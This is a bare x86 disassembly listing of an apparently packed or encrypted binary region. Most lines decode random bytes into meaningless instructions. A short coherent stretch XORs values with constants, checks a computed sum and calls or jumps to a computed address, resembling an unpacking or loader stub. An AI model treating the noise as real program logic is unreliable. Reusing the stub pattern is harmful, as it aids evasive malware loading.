  40daaa:	fs jmp 0xbd9c372e
  40dab0:	dec    esi
  40dab1:	push   0xa77cdacd
  40dab6:	pop    ds
  40dab7:	sti    
  40dab8:	xor    eax,0x77e56fe3
  40dabd:	leave  
  40dabe:	das    
  40dabf:	js     0x40dad3
  40dac1:	adc    BYTE PTR [edx],0x98
  40dac4:	jnp    0x40dacf
  40dac6:	or     eax,0x2899e20
  40dacb:	pop    ss
  40dacc:	jmp    0x652f:0x3ba8f802
  40dad3:	mov    bl,BYTE PTR [ecx]
  40dad5:	mov    esp,0x7e951f34
  40dada:	push   ss
  40dadb:	sbb    BYTE PTR [esi],dl
  40dadd:	inc    eax
  40dade:	ds push es
  40dae0:	lods   al,BYTE PTR ds:[esi]
  40dae1:	das    
  40dae2:	lock rcr DWORD PTR [esi],0xc6
  40dae6:	dec    esi
  40dae7:	jl     0x40db49
  40dae9:	stos   DWORD PTR es:[edi],eax
  40daea:	inc    BYTE PTR [ecx-0x4a]
  40daed:	and    dh,0xc4
  40daf0:	dec    ebx
  40daf1:	pop    edx
  40daf2:	enter  0x645c,0x0
  40daf6:	lahf   
  40daf7:	punpckldq mm4,mm4
  40dafa:	retf   
  40dafb:	add    eax,0xb150c236
  40db00:	popa   
  40db01:	test   DWORD PTR [eax],esp
  40db03:	into   
  40db04:	out    0x7a,al
  40db06:	shl    BYTE PTR [edi-0x1f],0xcc
  40db0a:	sub    eax,0xa348d5be
  40db0f:	dec    edi
  40db10:	sbb    DWORD PTR [ebp-0x13e76964],ebx
  40db16:	mov    al,ds:0x8e5319f5
  40db1b:	nop
  40db1c:	adc    al,0xc2
  40db1e:	(bad)  
  40db1f:	enter  0xbfe9,0x37
  40db23:	inc    edx
  40db24:	ret    
  40db25:	sar    BYTE PTR [ebx+ebx*1],cl
  40db28:	and    eax,0x88cf9f3c
  40db2d:	cmp    ch,dh
  40db2f:	nop
  40db30:	data16 fstp DWORD PTR [esi+0x33]
  40db34:	push   ebx
  40db35:	popf   
  40db36:	adc    BYTE PTR [ebp+0x46d15f41],0x51
  40db3d:	inc    esi
  40db3e:	inc    ebp
  40db3f:	inc    esp
  40db40:	mov    bl,0xad
  40db42:	mov    esi,0x5d2895de
  40db47:	(bad)  
  40db48:	xchg   ebp,eax
  40db49:	loopne 0x40db5f
  40db4b:	test   eax,0x9b393083
  40db50:	mov    DWORD PTR cs:[ecx+0x10abe992],ebx
  40db57:	retf   0xc398
  40db5a:	mov    ah,0xb2
  40db5c:	adc    eax,0xd4966fe0
  40db61:	adc    al,0xc2
  40db63:	stos   BYTE PTR es:[edi],al
  40db64:	dec    esi
  40db65:	out    dx,al
  40db66:	adc    DWORD PTR [edi-0xd421487],edi
  40db6c:	cs hlt 
  40db6e:	cli    
  40db6f:	cli    
  40db70:	lahf   
  40db71:	ror    BYTE PTR [ebp+0x29],1
  40db74:	xlat   BYTE PTR ds:[ebx]
  40db75:	jae    0x40dbcc
  40db77:	fwait
  40db78:	push   ebp
  40db79:	cmc    
  40db7a:	hlt    
  40db7b:	or     eax,edx
  40db7d:	enter  0x542c,0x7f
  40db81:	mov    edx,0x82430ab5
  40db86:	dec    esp
  40db87:	xchg   ebx,eax
  40db88:	or     cl,dh
  40db8a:	dec    eax
  40db8b:	adc    BYTE PTR [esi+0x5077238e],bh
  40db91:	sbb    al,0xdd
  40db93:	pop    edx
  40db94:	daa    
  40db95:	loope  0x40db92
  40db97:	in     al,dx
  40db98:	and    edi,DWORD PTR [ecx]
  40db9a:	cmp    eax,0xb669216b
  40db9f:	scas   al,BYTE PTR es:[edi]
  40dba0:	(bad)  
  40dba1:	mul    BYTE PTR [ecx]
  40dba3:	jb     0x40dc23
  40dba5:	fcom   st(3)
  40dba7:	xchg   esi,eax
  40dba8:	sub    eax,0xe1aaddae
  40dbad:	iret   
  40dbae:	sub    eax,0xd2545464
  40dbb3:	test   cl,dl
  40dbb5:	fnstsw WORD PTR cs:[ebp+0x79d30117]
  40dbbc:	cld    
  40dbbd:	jmp    0x40dbd1
  40dbbf:	adc    eax,DWORD PTR [esi]
  40dbc1:	fcmove st,st(3)
  40dbc3:	in     al,dx
  40dbc4:	test   BYTE PTR [edx],ch
  40dbc6:	das    
  40dbc7:	or     cl,ah
  40dbc9:	mov    ds:0xcd178d08,al
  40dbce:	das    
  40dbcf:	pop    esi
  40dbd0:	jp     0x40dc42
  40dbd2:	shr    BYTE PTR [esi+0x71dcf246],1
  40dbd8:	imul   edi,DWORD PTR ds:0xcbe339f9,0xffffffe4
  40dbdf:	dec    esi
  40dbe0:	lock mov bl,0x2
  40dbe3:	xor    ebx,DWORD PTR [ebp+0x3c23556f]
  40dbe9:	xchg   esi,eax
  40dbea:	xlat   BYTE PTR ds:[ebx]
  40dbeb:	out    dx,eax
  40dbec:	sub    al,BYTE PTR [esi]
  40dbee:	xchg   BYTE PTR [edx],bh
  40dbf0:	xor    dl,BYTE PTR [edi+0x67ccb420]
  40dbf6:	int    0xa2
  40dbf8:	adc    eax,0x506bc38f
  40dbfd:	aam    0x90
  40dbff:	adc    bh,BYTE PTR [ecx+ecx*8+0x4a303d1]
  40dc06:	shr    DWORD PTR [esi+0x1e],1
  40dc09:	les    ebp,FWORD PTR [edi+0x11]
  40dc0c:	xchg   ebp,eax
  40dc0d:	or     ebp,DWORD PTR [edi-0x5a]
  40dc10:	push   ecx
  40dc11:	loope  0x40dc70
  40dc13:	out    dx,eax
  40dc14:	push   cs
  40dc15:	mul    esp
  40dc17:	gs cmp edi,edx
  40dc1a:	xchg   DWORD PTR [edi+0x6f09fda],ebx
  40dc20:	xlat   BYTE PTR ds:[ebx]
  40dc21:	outs   dx,BYTE PTR ds:[esi]
  40dc22:	sahf   
  40dc23:	ror    DWORD PTR [ebx+0x10a68335],0x9
  40dc2a:	bndstx [ebx+ebx*2],bnd1
  40dc2e:	cdq    
  40dc2f:	add    al,0xbe
  40dc31:	inc    edx
  40dc32:	(bad)  
  40dc33:	cli    
  40dc34:	loope  0x40dbff
  40dc36:	mov    ecx,0xdaa3a9e4
  40dc3b:	xor    edx,ecx
  40dc3d:	cmp    al,ah
  40dc3f:	pusha  
  40dc40:	inc    esi
  40dc41:	xchg   edi,eax
  40dc42:	push   ecx
  40dc43:	add    al,0x2
  40dc45:	ins    DWORD PTR es:[edi],dx
  40dc46:	cmp    DWORD PTR [edx],edx
  40dc48:	fild   DWORD PTR [esi]
  40dc4a:	pop    edi
  40dc4b:	adc    eax,0xd16779af
  40dc50:	clc    
  40dc51:	lea    ebp,[esi]
  40dc53:	dec    edi
  40dc54:	fidivr WORD PTR [esi+eax*4+0x49177cd5]
  40dc5b:	and    edi,DWORD PTR [ecx-0x7c4778dc]
  40dc61:	add    DWORD PTR [eax+0x73],ebx
  40dc64:	mov    edx,DWORD PTR [ebp+0x8]
  40dc67:	mov    edi,DWORD PTR [ebp-0x24]
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8+0x2ccec898]
  40dc7d:	and    ebp,edi
  40dc7f:	xor    eax,0x7d7e7e9a
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dc6e
  40dc88:	fs pop esp
  40dc8a:	mov    al,0x3
  40dc8c:	mov    al,ds:0x89e70b6b
  40dc91:	shr    BYTE PTR [eax-0x4c],1
  40dc94:	in     eax,dx
  40dc95:	addr16 repz imul ebp,ebp,0x84383b54
  40dc9d:	stos   DWORD PTR es:[edi],eax
  40dc9e:	and    eax,0xa29c301a
  40dca3:	pop    DWORD PTR [eax]
  40dca5:	xor    DWORD PTR [eax],0xe9f9cd86
  40dcab:	jge    0x40dcf2
  40dcad:	addr16 call 0xe58730e8
  40dcb3:	int    0x0
  40dcb5:	ins    BYTE PTR es:[edi],dx
  40dcb6:	call   0xa1a3:0x87cbf1c0
  40dcbd:	and    eax,0xbf719fc2
  40dcc2:	push   ds
  40dcc3:	xor    BYTE PTR [esi],ch
  40dcc5:	cwde   
  40dcc6:	out    0x91,eax
  40dcc8:	imul   esp,DWORD PTR [ecx+0x64],0xffffffb8
  40dccc:	in     al,dx
  40dccd:	or     DWORD PTR [ebx],esp
  40dccf:	(bad)  
  40dcd0:	or     eax,DWORD PTR [edi+0x6dbfbda0]
  40dcd6:	push   eax
  40dcd7:	or     DWORD PTR [edi],esi
  40dcd9:	sahf   
  40dcda:	icebp  
  40dcdb:	sti    
  40dcdc:	add    BYTE PTR [eax],0x46
  40dcdf:	and    al,0x63
  40dce1:	jns    0x40dd39
  40dce3:	test   esp,0xe37d29e7
  40dce9:	sti    
  40dcea:	pop    edi
  40dceb:	leave  
  40dcec:	sub    al,0x6f
  40dcee:	jg     0x40dcfd
  40dcf0:	mov    ch,0x1c
  40dcf2:	jecxz  0x40dc8f
  40dcf4:	bound  esi,QWORD PTR [edx-0x20]
  40dcf7:	cld    
  40dcf8:	fadd   DWORD PTR [ecx+0x3ce89b8a]
  40dcfe:	fistp  WORD PTR ds:0x64c7b62b
  40dd04:	lock inc ebx
  40dd06:	call   0xce3:0xa289affa
  40dd0d:	xchg   DWORD PTR [ebx+esi*8],esi
  40dd10:	out    0x0,eax
  40dd12:	dec    esp
  40dd13:	f2xm1  
  40dd15:	fsubp  st(3),st
  40dd17:	and    al,0xa
  40dd19:	shl    BYTE PTR [ecx-0x70],1
  40dd1c:	das    
  40dd1d:	pop    ss
  40dd1e:	sbb    ebp,DWORD PTR [edi]
  40dd20:	push   eax
  40dd21:	pop    ds
  40dd22:	push   esp
  40dd23:	push   ecx
  40dd24:	imul   edx,DWORD PTR [edx-0x44d5ad62],0x60e7f8c3
  40dd2e:	cmp    eax,0x7e399242
  40dd33:	adc    BYTE PTR [edi+0x10],0x94
  40dd37:	and    eax,DWORD PTR [edi]
  40dd39:	pushf  
  40dd3a:	jns    0x40dd17
  40dd3c:	push   esp
  40dd3d:	stos   BYTE PTR es:[edi],al
  40dd3e:	std    
  40dd3f:	punpckldq mm2,DWORD PTR [eax+0x70]
  40dd43:	aam    0x57
  40dd45:	cmp    edx,DWORD PTR [ebx+ebx*4+0x3b]
  40dd49:	push   eax
  40dd4a:	data16 jl 0x40dcfd
  40dd4d:	shr    BYTE PTR [edx],0xf1
  40dd50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd51:	sub    al,0x2e
  40dd53:	mov    bl,0x83
  40dd55:	test   eax,0xc634e28d
  40dd5a:	pop    ebp
  40dd5b:	and    ecx,eax
  40dd5d:	les    edi,FWORD PTR [esi]
  40dd5f:	dec    ecx
  40dd60:	mov    ebx,0x804bb58b
  40dd65:	cmp    al,0xdd
  40dd67:	ins    BYTE PTR es:[edi],dx
  40dd68:	mov    ch,0x7f
  40dd6a:	inc    edx
  40dd6b:	retf   
  40dd6c:	shl    DWORD PTR [ebp-0x60528e9c],cl
  40dd72:	mov    cl,0xad
  40dd74:	scas   al,BYTE PTR es:[edi]
  40dd75:	push   0x5faa6830
  40dd7a:	inc    edx
  40dd7b:	neg    bh
  40dd7d:	fwait
  40dd7e:	and    esi,DWORD PTR [edi-0x24893e2f]
  40dd84:	jmp    FWORD PTR [eax+0x31cb3781]
  40dd8a:	sub    DWORD PTR [eax+esi*2+0x20],eax
  40dd8e:	xchg   BYTE PTR [edx+0x1f1cdd1a],bl
  40dd94:	or     DWORD PTR [ebx-0x6b3ee72d],ebx
  40dd9a:	ins    DWORD PTR es:[edi],dx
  40dd9b:	xor    BYTE PTR ds:0x59e1621d,dh
  40dda1:	xchg   edi,eax
  40dda2:	shr    BYTE PTR [edx+0x7b7706a5],0x5b
  40dda9:	mov    eax,0x973b1559
  40ddae:	(bad)  
  40ddaf:	sub    ecx,edx
  40ddb1:	pop    ss
  40ddb2:	mov    bl,0x6c
  40ddb4:	add    edx,esi
  40ddb6:	sar    esi,cl
  40ddb8:	loop   0x40dd9a
  40ddba:	jp     0x40ddbb
  40ddbc:	mov    ch,0x54
  40ddbe:	aad    0xb1
  40ddc0:	sar    BYTE PTR [ebx+0x1dbd20fc],0xa4
  40ddc7:	scas   al,BYTE PTR es:[edi]
  40ddc8:	pop    edx
  40ddc9:	mov    edx,0xf8d0fc0
  40ddce:	cli    
  40ddcf:	xchg   ecx,eax
  40ddd0:	test   dh,dh
  40ddd2:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40ddd5:	(bad)  
  40ddd6:	push   esi
  40ddd7:	sbb    bl,dl
  40ddd9:	add    al,0xf7
  40dddb:	jecxz  0x40ddd7
  40dddd:	dec    esp
  40ddde:	imul   esi,DWORD PTR [eax-0x35],0x5b
  40dde2:	or     eax,0xca20089e
  40dde7:	test   eax,0x88d2e05d
  40ddec:	stos   BYTE PTR es:[edi],al
  40dded:	xor    cl,BYTE PTR [ebp-0x3a]
  40ddf0:	into   
  40ddf1:	mov    WORD PTR [ebx+0x1f],?
  40ddf4:	sub    eax,0x9f25061d
  40ddf9:	stos   DWORD PTR es:[edi],eax
  40ddfa:	push   eax
  40ddfb:	cmp    ebp,DWORD PTR [eax-0x3d]
  40ddfe:	dec    ebp
  40ddff:	mov    bl,0xc6
  40de01:	pop    edi
  40de02:	fld    QWORD PTR [eax*2+0x3eaec662]
  40de09:	xor    esp,0xffffff81
  40de0c:	jge    0x40de4a
  40de0e:	out    0x3e,eax
  40de10:	push   eax
  40de11:	cmp    al,0x38
  40de13:	mov    bl,0xe7
  40de15:	repz push esp
  40de17:	cmp    dl,dl
  40de19:	push   esp
  40de1a:	out    dx,eax
  40de1b:	xchg   edi,eax
  40de1c:	ins    BYTE PTR es:[edi],dx
  40de1d:	mov    DWORD PTR [edi-0x30],esp
  40de20:	pop    edi
  40de21:	retf   0x9c19
  40de24:	mov    ds,WORD PTR [ebx+0x3f]
  40de27:	jae    0x40ddc4
  40de29:	mov    al,ds:0xfaad0c64
  40de2e:	pop    eax
  40de2f:	xchg   ebx,eax
  40de30:	push   ebx
  40de31:	outs   dx,BYTE PTR ds:[esi]
  40de32:	and    eax,0xc94f1b4e
  40de37:	scas   al,BYTE PTR es:[edi]
  40de38:	xchg   esi,eax
  40de39:	sub    eax,0xfb6ea1e2
  40de3e:	xchg   ecx,eax
  40de3f:	in     eax,0xe0
  40de41:	daa    
  40de42:	sbb    al,0xd
  40de44:	rol    BYTE PTR [edx-0x1f],1
  40de47:	out    dx,eax
  40de48:	int3   
  40de49:	mov    esi,gs
  40de4b:	(bad)  
  40de4c:	sti    
  40de4d:	iret   
  40de4e:	mov    ds:0xe11a86ac,al
  40de53:	aas    
  40de54:	sbb    BYTE PTR [ecx],dh
  40de56:	adc    BYTE PTR [edx+0xd],bl
  40de59:	dec    edx
  40de5a:	popf   
  40de5b:	jecxz  0x40de3b
  40de5d:	xor    cl,BYTE PTR [ebx]
  40de5f:	jmp    0xe84d:0x24dfb712
  40de66:	jbe    0x40de34
  40de68:	sbb    BYTE PTR [ebp+0x6e7f92c8],dl
  40de6e:	inc    eax
  40de6f:	adc    al,cl
  40de71:	les    eax,FWORD PTR [edi+0x734751b6]
  40de77:	fdiv   QWORD PTR [esp+ecx*4-0x37865ab]
  40de7e:	popf   
  40de7f:	push   ds
  40de80:	fisttp DWORD PTR [esi]
  40de82:	and    edx,DWORD PTR [esi-0x70]
  40de85:	xchg   esp,eax
  40de86:	sbb    dl,ah
  40de88:	mov    ah,0x3e
  40de8a:	push   ds
  40de8b:	mov    ch,0x61
  40de8d:	mov    ebp,0xf6fd6c21
  40de92:	es scas al,BYTE PTR es:[edi]
  40de94:	enter  0xcc,0x46
  40de98:	add    eax,0xdda7656
  40de9d:	dec    esi
  40de9e:	test   DWORD PTR [edx+0x5b4816fa],esi
  40dea4:	out    dx,eax
  40dea5:	xor    edi,eax
  40dea7:	je     0x40deab
  40dea9:	test   eax,0x59b25a20
  40deae:	mov    ah,0x7e
  40deb0:	or     ch,dh
  40deb2:	jno    0x40de9f
  40deb4:	test   al,0x71
  40deb6:	jge    0x40de53
  40deb8:	push   esi
  40deb9:	jle    0x40de55
  40debb:	aas    
  40debc:	xchg   esp,eax
  40debd:	jno    0x40de58
  40debf:	in     eax,dx
  40dec0:	mov    ah,BYTE PTR ds:0x7277cb67
  40dec6:	dec    esi
  40dec7:	lahf   
  40dec8:	test   eax,0x670efc6e
  40decd:	push   0x643d64c9
  40ded2:	xor    dl,ah
  40ded4:	mov    edi,DWORD PTR [eax+0x61]
  40ded7:	scas   al,BYTE PTR es:[edi]
  40ded8:	mov    ds:0x982b5132,al
  40dedd:	xor    al,0xcb
  40dedf:	stos   DWORD PTR es:[edi],eax
  40dee0:	(bad)  
  40dee1:	push   esp
  40dee2:	inc    eax
  40dee3:	sbb    ch,BYTE PTR [ecx+0xa59dc35]
  40dee9:	call   DWORD PTR [ebx+edi*4]
  40deec:	dec    ecx
  40deed:	dec    ebx
  40deee:	sub    edx,edx
  40def0:	push   ss
  40def1:	pop    ss
  40def2:	and    ebx,DWORD PTR [eax+0x697e4abb]
  40def8:	in     eax,dx
  40def9:	and    ah,BYTE PTR [edi-0x5c928b3c]
  40deff:	xchg   DWORD PTR [eax],eax
  40df01:	test   al,0xe5
  40df03:	adc    eax,ecx
  40df05:	dec    ecx
  40df06:	sub    ebx,DWORD PTR [edi-0x80]
  40df09:	cmc    
  40df0a:	dec    esi
  40df0b:	retf   0x4d44
  40df0e:	mov    esi,0xe94ca0f1
  40df13:	add    al,0x86
  40df15:	mov    ebx,0x53f59627
  40df1a:	xchg   ecx,eax
  40df1b:	enter  0x98a6,0x9d
  40df1f:	adc    cl,BYTE PTR [ebx]
  40df21:	xchg   esi,eax
  40df22:	push   ss
  40df23:	mov    edi,0x888e3573
  40df28:	push   ds
  40df29:	cwde   
  40df2a:	lahf   
  40df2b:	jnp    0x40df5c
  40df2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df2e:	mov    bl,0x68
  40df30:	mov    eax,ds:0x233bd1d
  40df35:	mov    ds:0x10982fb1,eax
  40df3a:	scas   al,BYTE PTR es:[edi]
  40df3b:	ja     0x40df24
  40df3d:	dec    esi
  40df3e:	xchg   BYTE PTR [ebp+eiz*2+0x2b1b751a],bh
  40df45:	xchg   edi,eax
  40df46:	add    edx,DWORD PTR [ebp-0x1a]
  40df49:	into   
  40df4a:	or     ebp,DWORD PTR [edx]
  40df4c:	xor    eax,0xb3fb71ca
  40df51:	xchg   edi,eax
  40df52:	aad    0x1
  40df54:	xor    eax,0x734f3703
  40df59:	fdivr  DWORD PTR [ebx-0x5d]
  40df5c:	or     al,0x5e
  40df5e:	int3   
  40df5f:	fwait
  40df60:	and    esi,DWORD PTR [ebp+0x370e418e]
  40df66:	sbb    ebx,DWORD PTR [ebx-0x2d17b2ba]
  40df6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df6d:	in     eax,dx
  40df6e:	push   ss
  40df6f:	ffreep st(1)
  40df71:	jnp    0x40df7e
  40df73:	dec    ebx
  40df74:	push   esi
  40df75:	leave  
  40df76:	sbb    ebx,DWORD PTR [ebp+0x3fc773a]
  40df7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df7d:	xor    DWORD PTR [ebx+0x570b64b4],edi
  40df83:	pop    ebx
  40df84:	retf   0xc718
  40df87:	mov    ah,0x76
  40df89:	out    dx,al
  40df8a:	mov    DWORD PTR [edi+edx*4],eax
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	addps  xmm1,XMMWORD PTR cs:[ecx-0x66cf2842]
  40e02a:	jle    0x40e0aa
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	in     eax,dx
  40e031:	push   ebx
  40e032:	inc    esp
  40e033:	push   ebp
  40e034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e035:	icebp  
  40e036:	nop
  40e037:	push   edx
  40e038:	add    BYTE PTR [edi],0x3c
  40e03b:	cmc    
  40e03c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e03d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e03e:	call   0x3a42:0xb37a3172
  40e045:	jecxz  0x40e010
  40e047:	mov    dh,0xe7
  40e049:	inc    esp
  40e04a:	ja     0x40e081
  40e04c:	jmp    0xa6fa:0x9d53e747
  40e053:	cmp    eax,0x1881ab53
  40e058:	mov    ds,WORD PTR [edi-0x25742b6f]
  40e05e:	add    eax,0xcd3881a4
  40e063:	js     0x40e01a
  40e065:	(bad)  
  40e066:	xlat   BYTE PTR ds:[ebx]
  40e067:	xchg   ebp,eax
  40e068:	jb     0x40e07d
  40e06a:	arpl   WORD PTR [ecx-0x5e],bx
  40e06d:	push   0xe4ed81d6
  40e072:	enter  0x10fc,0xd6
  40e076:	add    DWORD PTR [ebp-0x4403acc],edi
  40e07c:	repz and eax,0xdddafc7d
  40e082:	sub    cl,bh
  40e084:	loopne 0x40e105
  40e086:	loopne 0x40e03c
  40e088:	jo     0x40e025
  40e08a:	int3   
  40e08b:	ss mov al,0xd4
  40e08e:	xchg   ecx,ebx
  40e090:	aas    
  40e091:	push   ds
  40e092:	mov    ebp,0x96abccdd
  40e097:	dec    ebx
  40e098:	adc    al,bl
  40e09a:	jbe    0x40e094
  40e09c:	stos   DWORD PTR es:[edi],eax
  40e09d:	es xchg esp,eax
  40e09f:	push   ebp
  40e0a0:	push   0xc0c37d03
  40e0a5:	retf   
  40e0a6:	or     edx,esp
  40e0a8:	or     BYTE PTR [ecx-0x5796dda8],0xe
  40e0af:	cwde   
  40e0b0:	neg    dl
  40e0b2:	stos   DWORD PTR es:[edi],eax
  40e0b3:	jae    0x40e0ba
  40e0b5:	dec    ebx
  40e0b6:	push   ds
  40e0b7:	idiv   esi
  40e0b9:	and    ebp,DWORD PTR [edi]
  40e0bb:	lods   eax,DWORD PTR ds:[esi]
  40e0bc:	stc    
  40e0bd:	sub    edx,ebp
  40e0bf:	jmp    0xe88:0x7f531022
  40e0c6:	retf   
  40e0c7:	xchg   edi,eax
  40e0c8:	loope  0x40e0df
  40e0ca:	mov    bh,0xec
  40e0cc:	xlat   BYTE PTR ds:[ebx]
  40e0cd:	push   cs
  40e0ce:	xlat   BYTE PTR ds:[ebx]
  40e0cf:	jl     0x40e0f6
  40e0d1:	cmp    DWORD PTR [ecx+0x2e55e69d],ebx
  40e0d7:	xchg   edx,eax
  40e0d8:	xlat   BYTE PTR ds:[ebx]
  40e0d9:	jl     0x40e0aa
  40e0db:	mov    ebx,0xd5aa2d2c
  40e0e0:	fisubr DWORD PTR [ecx+0x1b]
  40e0e3:	push   0x6565900
  40e0e8:	sbb    BYTE PTR ds:0xcd37b5db,bh
  40e0ee:	sub    DWORD PTR [ebx-0x6bebe442],ebx
  40e0f4:	dec    esp
  40e0f5:	dec    ecx
  40e0f6:	dec    edi
  40e0f7:	mov    al,ds:0x5a189a51
  40e0fc:	ja     0x40e162
  40e0fe:	pop    ds
  40e0ff:	jle    0x40e0a8
  40e101:	cmp    bh,cl
  40e103:	mov    eax,0x188779c1
  40e108:	pop    ebx
  40e109:	ins    BYTE PTR es:[edi],dx
  40e10a:	push   ss
  40e10b:	int3   
  40e10c:	outs   dx,BYTE PTR ds:[esi]
  40e10d:	sub    eax,0x8e6ed13
  40e112:	hlt    
  40e113:	inc    ebx
  40e114:	dec    ebp
  40e115:	in     al,dx
  40e116:	mov    ecx,0xb8e9eeb1
  40e11b:	sub    al,0x12
  40e11d:	sbb    DWORD PTR [esi+0xbf71a5],0xffffffdd
  40e124:	mov    ebx,0x92a58d5f
  40e129:	cmp    al,0xc1
  40e12b:	retf   0x90a
  40e12e:	fnstenv [ebx]
  40e130:	es stc 
  40e132:	sub    BYTE PTR [ebp+0x5f],dh
  40e135:	pop    ebp
  40e136:	xchg   DWORD PTR [edi],eax
  40e138:	xchg   BYTE PTR [ebx],ch
  40e13a:	jg     0x40e107
  40e13c:	ret    
  40e13d:	in     al,0xbb
  40e13f:	add    dh,bl
  40e141:	mov    ch,0x2f
  40e143:	jae    0x40e10f
  40e145:	mov    ebx,edi
  40e147:	inc    edx
  40e148:	mov    esp,0x34ab279e
  40e14d:	jp     0x40e11c
  40e14f:	mov    al,0x80
  40e151:	mov    ecx,0x3cac0734
  40e156:	jmp    0x40e155
  40e158:	mov    DWORD PTR [esi],esi
  40e15a:	jnp    0x40e113
  40e15c:	scas   eax,DWORD PTR es:[edi]
  40e15d:	jne    0x40e151
  40e15f:	pop    esi
  40e160:	mov    WORD PTR [edx],ds
  40e162:	iret   
  40e163:	xor    BYTE PTR [edx],dl
  40e165:	repz adc edx,edi
  40e168:	cmp    al,0x80
  40e16a:	xor    ebx,DWORD PTR [esi+0x45f6de49]
  40e170:	cmp    cl,BYTE PTR [ebx+0x2d9bbe01]
  40e176:	fbld   TBYTE PTR [ebx+0x1488cd03]
  40e17c:	inc    ecx
  40e17d:	xor    ah,BYTE PTR [edi+0x5bba7c98]
  40e183:	shl    cl,0x31
  40e186:	xchg   DWORD PTR [esi],edx
  40e188:	dec    edx
  40e189:	jae    0x40e1cd
  40e18b:	mov    esp,0x590db14
  40e190:	pop    es
  40e191:	scas   al,BYTE PTR es:[edi]
  40e192:	shl    cl,cl
  40e194:	in     eax,dx
  40e195:	inc    ebp
  40e196:	pusha  
  40e197:	call   0xce7f53d0
  40e19c:	enter  0xae1c,0x82
  40e1a0:	stos   BYTE PTR es:[edi],al
  40e1a1:	out    dx,eax
  40e1a2:	dec    esp
  40e1a3:	dec    BYTE PTR [ebx-0x5c8943ee]
  40e1a9:	mov    al,0xde
  40e1ab:	jno    0x40e20f
  40e1ad:	jmp    0x1459:0x868e5190
  40e1b4:	jp     0x40e1b2
  40e1b6:	fwait
  40e1b7:	stos   DWORD PTR es:[edi],eax
  40e1b8:	cs dec ecx
  40e1ba:	xor    bl,BYTE PTR [edx]
  40e1bc:	dec    ebx
  40e1bd:	loope  0x40e1af
  40e1bf:	loope  0x40e19d
  40e1c1:	nop
  40e1c2:	and    esi,DWORD PTR [esi+0x66bd14f4]
  40e1c8:	arpl   WORD PTR [edi+esi*8+0x55a54383],sp
  40e1cf:	and    eax,0x2f3954ee
  40e1d4:	in     eax,dx
  40e1d5:	mov    esp,0xb5b79f71
  40e1da:	repz mov ds:0x9155ee28,al
  40e1e0:	jae    0x40e17c
  40e1e2:	retf   
  40e1e3:	or     ebp,ecx
  40e1e5:	(bad)  
  40e1e6:	jmp    0x40e24c
  40e1e8:	sub    al,0x68
  40e1ea:	(bad)  
  40e1eb:	push   ds
  40e1ec:	mov    al,0xe6
  40e1ee:	pusha  
  40e1ef:	div    BYTE PTR [ebp+0x42]
  40e1f2:	(bad)  
  40e1f3:	(bad)  
  40e1f4:	arpl   WORD PTR [ebx-0x36c29dca],sp
  40e1fa:	iret   
  40e1fb:	stc    
  40e1fc:	pop    esp
  40e1fd:	mov    WORD PTR [edi-0x62],?
  40e200:	and    DWORD PTR [eax+0x14072d23],ecx
  40e206:	in     al,dx
  40e207:	imul   edi,DWORD PTR [ebx],0x2
  40e20a:	jbe    0x40e239
  40e20c:	lea    ebx,[edi-0x6704c020]
  40e212:	mov    ecx,0x206cc55c
  40e217:	mov    al,0xfa
  40e219:	stos   BYTE PTR es:[edi],al
  40e21a:	jnp    0x40e252
  40e21c:	jae    0x40e1a4
  40e21e:	xchg   edx,eax
  40e21f:	pop    ecx
  40e220:	imul   edi
  40e222:	nop
